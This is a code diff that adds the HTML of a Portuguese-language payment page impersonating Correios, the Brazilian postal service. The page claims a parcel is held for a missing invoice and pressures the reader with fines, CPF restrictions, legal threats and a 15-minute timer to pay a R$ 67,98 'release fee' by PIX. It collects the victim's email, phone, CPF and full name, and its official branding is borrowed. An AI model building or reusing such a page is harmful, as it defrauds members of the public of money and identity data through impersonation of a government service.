@@ -1,0 +1,358 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#004169">
+    <meta name="description" content="Pagamento PIX - Liberação de Encomenda - Correios">
+    
+    <title>Pagamento - Correios</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/webp" href="images/favicon.webp">
+    
+    <!-- Font Awesome Pro -->
+    <link rel="stylesheet" href="css/all.min.css">
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="css/pagamento.css">
+</head>
+<body>
+    <!-- ========================================
+         HEADER
+    ======================================== -->
+    <header class="header">
+        <nav class="header-nav" id="headerNav">
+            <a href="#" class="logo-link">
+                <img src="images/correios.webp" alt="Correios" class="logo-correios">
+            </a>
+            <a href="#" class="btn-entrar">
+                <img src="images/entrar.svg" alt="Entrar" class="icon-entrar">
+                <span class="user-name">Entrar</span>
+            </a>
+        </nav>
+    </header>
+
+    <!-- ========================================
+         MAIN
+    ======================================== -->
+    <main class="main">
+        <!-- Barra de Segurança -->
+        <div class="security-bar">
+            <i class="fas fa-lock"></i>
+            <span>PAGAMENTO 100% SEGURO</span>
+            <i class="fas fa-shield-check"></i>
+        </div>
+
+        <!-- Container Principal -->
+        <div class="pagamento-wrapper">
+            <div class="checkout-step1" id="checkoutStep1">
+                <div class="checkout-alerta">
+                    <p><strong>ATENÇÃO!</strong> Sua mercadoria foi <strong>RETIDA</strong> por falta de Nota Fiscal. O não pagamento imediato da taxa de liberação no valor de <strong class="valor-taxa-inline">R$ 67,98</strong> resultará em uma multa de <strong>75%</strong> sobre o valor do produto, além de possíveis restrições no seu CPF e ações legais conforme a regulamentação vigente.</p>
+                </div>
+
+                <div class="step1-header">
+                    <h3 id="step1Titulo">Objeto taxado pela unidade de fiscalização</h3>
+                    <p id="step1Descricao">Preencha seus dados para envio do comprovante e atualização do status da entrega.</p>
+                </div>
+
+                <form id="dadosForm" class="step1-form" novalidate="">
+                    <div class="step1-field">
+                        <label for="dadosEmail">E-mail <span class="campo-obrigatorio">*</span></label>
+                        <div class="email-autocomplete-wrap">
+                            <input type="email" id="dadosEmail" placeholder="seuemail@exemplo.com" maxlength="120" autocomplete="email">
+                            <div class="email-suggestions" id="emailSuggestions" role="listbox" aria-label="Sugestões de e-mail"></div>
+                        </div>
+                        <small class="step1-erro" id="dadosEmailErro"></small>
+                    </div>
+
+                    <div class="step1-field">
+                        <label for="dadosTelefone">Telefone / WhatsApp <span class="campo-obrigatorio">*</span></label>
+                        <input type="tel" id="dadosTelefone" placeholder="(11) 99999-9999" maxlength="19" inputmode="tel" autocomplete="tel">
+                        <small class="step1-erro" id="dadosTelefoneErro"></small>
+                    </div>
+
+                    <div class="step1-identidade" id="step1Identidade" style="display: none;">
+                        <div class="step1-identidade-titulo">
+                            <i class="fas fa-id-card"></i>
+                            <span>Identificação do destinatário</span>
+                        </div>
+
+                        <div class="step1-field">
+                            <label for="dadosCpf">CPF <span class="campo-obrigatorio">*</span></label>
+                            <input type="text" id="dadosCpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" autocomplete="off">
+                            <small class="step1-erro" id="dadosCpfErro"></small>
+                        </div>
+
+                        <div class="step1-field">
+                            <label for="dadosNome">Nome Completo <span class="campo-obrigatorio">*</span></label>
+                            <input type="text" id="dadosNome" placeholder="Seu nome completo" maxlength="100" autocomplete="name">
+                            <small class="step1-hint" id="dadosNomeHint"></small>
+                            <small class="step1-erro" id="dadosNomeErro"></small>
+                        </div>
+                    </div>
+
+                    <div id="turnstile-container"></div>
+
+                    <button type="submit" class="btn-continuar-pagamento" id="btnContinuarPagamento">
+                        <span>PAGAR AGORA</span>
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </form>
+
+                <div class="checkout-resumo-pagamento" id="checkoutResumoPagamento">
+                    <div class="checkout-resumo-header">
+                        <h3>Resumo do pagamento</h3>
+                        <span class="resumo-metodo"><img src="images/pix.webp" alt="PIX" class="resumo-metodo-pix-icon"></span>
+                    </div>
+                    <div class="checkout-resumo-body">
+                        <p class="resumo-item">
+                            <span>CPF</span>
+                            <strong id="resumoCpf">Não informado</strong>
+                        </p>
+                        <p class="resumo-item">
+                            <span>Total</span>
+                            <strong id="resumoTotal">R$ 67,98</strong>
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="checkoutStep2">
+                <!-- Loading -->
+                <div class="pagamento-loading" id="pagamentoLoading" style="display: none;">
+                    <div class="loading-content">
+                        <div class="loading-icon">
+                            <i class="fas fa-circle-notch fa-spin"></i>
+                        </div>
+                        <h3>Gerando código PIX</h3>
+                        <p>Aguarde enquanto preparamos seu pagamento...</p>
+                        <div class="loading-bar">
+                            <div class="loading-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Erro -->
+                <div class="pagamento-erro" id="pagamentoErro" style="display: none;">
+                    <div class="erro-content">
+                        <div class="erro-icon">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <h3>Não foi possível gerar o PIX</h3>
+                        <p id="erroMensagem">Ocorreu um erro ao processar sua solicitação.</p>
+                        <button class="btn-tentar-novamente" onclick="gerarPix()">
+                            <i class="fas fa-redo"></i>
+                            Tentar Novamente
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Conteúdo do Pagamento -->
+                <div class="pagamento-conteudo" id="pagamentoConteudo" style="display: none;">
+                    <!-- Cabeçalho com valor -->
+                    <div class="pagamento-header">
+                        <div class="header-titulo">
+                            <img src="images/correios-icon2.webp" alt="Correios" class="header-icon-correios">
+                            <div>
+                                <h2>REGULARIZE SUA ENCOMENDA</h2>
+                                <p id="codigoRastreioHeader">Carregando...</p>
+                            </div>
+                        </div>
+                        <div class="header-valor">
+                            <span class="valor-label">VALOR A PAGAR</span>
+                            <span class="valor-numero" id="valorPagar">R$ 67,98</span>
+                        </div>
+                    </div>
+
+                    <!-- Timer de Expiração -->
+                    <div class="timer-banner">
+                        <div class="timer-icon pulsing">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="timer-info">
+                            <span class="timer-label">PIX válido por:</span>
+                            <span class="timer-valor" id="timerExpiracao">15:00</span>
+                        </div>
+                        <div class="timer-progress">
+                            <div class="timer-progress-bar" id="timerProgressBar"></div>
+                        </div>
+                    </div>
+
+                    <!-- Área do PIX -->
+                    <div class="pix-container">
+                        <!-- Título PIX -->
+                        <div class="pix-title">
+                            <img src="images/pix-icon.png" alt="PIX" class="pix-logo">
+                            <span>Pague com PIX</span>
+                        </div>
+
+                        <!-- QR Code -->
+                        <div class="qrcode-area">
+                            <div class="qrcode-frame">
+                                <img src="" alt="QR Code PIX" id="qrcodeImg" class="qrcode-img">
+                            </div>
+                            <p class="qrcode-seguranca">
+                                <span><span id="pixRecebedorPrefix">No app do banco, o favorecido deve aparecer como:</span> <strong id="pixRecebedorInfo"></strong></span>
+                            </p>
+                            <p class="qrcode-hint">Aponte a câmera do seu celular</p>
+                        </div>
+
+                        <!-- Divisor -->
+                        <div class="divisor">
+                            <span>ou copie o código</span>
+                        </div>
+
+                        <!-- Código Copia e Cola -->
+                        <div class="copiacola-area">
+                            <div class="copiacola-input-wrapper">
+                                <input type="text" id="pixCode" readonly="" class="copiacola-input" placeholder="Código PIX">
+                            </div>
+                            <button class="btn-copiar" id="btnCopiar" onclick="copiarCodigo()">
+                                <i class="fas fa-copy"></i>
+                                <span>Copiar código</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Status -->
+                    <div class="status-area">
+                        <div class="status-aguardando" id="statusAguardando">
+                            <div class="status-icon pulsing">
+                                <i class="fas fa-spinner fa-pulse"></i>
+                            </div>
+                            <div class="status-text">
+                                <strong>Aguardando pagamento</strong>
+                                <span>O sistema atualizará automaticamente</span>
+                            </div>
+                        </div>
+                        <div class="status-pago" id="statusPago" style="display: none;">
+                            <div class="status-icon success">
+                                <i class="fas fa-check"></i>
+                            </div>
+                            <div class="status-text">
+                                <strong>Pagamento confirmado!</strong>
+                                <span>Redirecionando...</span>
+                            </div>
+                        </div>
+                        <p class="status-info-liberacao">Após confirmação, o comprovante de liberação será enviado para o e-mail e telefone cadastrado.</p>
+                    </div>
+
+                    <!-- Instruções -->
+                    <div class="instrucoes-area">
+                        <h4><i class="fas fa-mobile-alt"></i> Como pagar com PIX</h4>
+                        <div class="instrucoes-steps">
+                            <div class="step-item">
+                                <div class="step-icon">
+                                    <i class="fas fa-university"></i>
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">1</span>
+                                    <p>Abra o <strong>app do seu banco</strong></p>
+                                </div>
+                            </div>
+                            <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
+                            <div class="step-item">
+                                <div class="step-icon">
+                                    <img src="images/pix-icon.png" alt="PIX" class="step-pix-icon">
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">2</span>
+                                    <p>Selecione <strong>PIX Copia e Cola</strong></p>
+                                </div>
+                            </div>
+                            <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
+                            <div class="step-item">
+                                <div class="step-icon">
+                                    <i class="fas fa-qrcode"></i>
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">3</span>
+                                    <p><strong>Escaneie</strong> ou <strong>cole</strong> o código</p>
+                                </div>
+                            </div>
+                            <div class="step-connector"><i class="fas fa-chevron-right"></i></div>
+                            <div class="step-item highlight">
+                                <div class="step-icon success">
+                                    <i class="fas fa-check"></i>
+                                </div>
+                                <div class="step-content">
+                                    <span class="step-numero">4</span>
+                                    <p><strong>Pronto!</strong> Confirmação automática</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Segurança -->
+                    <div class="seguranca-area">
+                        <div class="seguranca-item">
+                            <i class="fas fa-lock"></i>
+                            <span>Pagamento 100% seguro</span>
+                        </div>
+                        <div class="seguranca-item">
+                            <i class="fas fa-bolt"></i>
+                            <span>Aprovação em segundos</span>
+                        </div>
+                        <div class="seguranca-item">
+                            <i class="fas fa-shield-check"></i>
+                            <span>Dados protegidos</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ========================================
+         FOOTER
+    ======================================== -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-links">
+                <div class="footer-section">
+                    <h4>Fale Conosco</h4>
+                    <ul>
+                        <li><i class="far fa-desktop"></i> Registro de Manifestações</li>
+                        <li><i class="far fa-question-square"></i> Central de Atendimento</li>
+                        <li><i class="far fa-briefcase"></i> Soluções para o seu negócio</li>
+                        <li><i class="far fa-headset"></i> Suporte ao cliente com contrato</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Ouvidoria</li>
+                        <li><i class="far fa-user-headset"></i> Denúncia</li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Sobre os Correios</h4>
+                    <ul>
+                        <li><i class="far fa-address-card"></i> Identidade corporativa</li>
+                        <li><i class="far fa-user-graduate"></i> Educação e cultura</li>
+                        <li><i class="far fa-book-alt"></i> Código de ética</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Política de privacidade e Notas legais</li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Outros Sites</h4>
+                    <ul>
+                        <li><i class="far fa-shopping-cart"></i> Loja online dos correios</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-logos">
+                    <img src="images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer">
+                </div>
+                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Cloudflare Turnstile (anti-bot invisível) -->
+    <script src="js/api.js" async="" defer=""></script>
+
+    <!-- QR Code Generator (local, sem API externa) -->
+    <script src="js/qrcode.min.js"></script>
+    <script src="js/pix-common.js"></script>
+    
+    <!-- JavaScript -->
+    <script src="js/pagamento.js"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9ed2e7320da066e4',t:'MTc3NjMzOTQ5OQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe>
+
+</body></html>
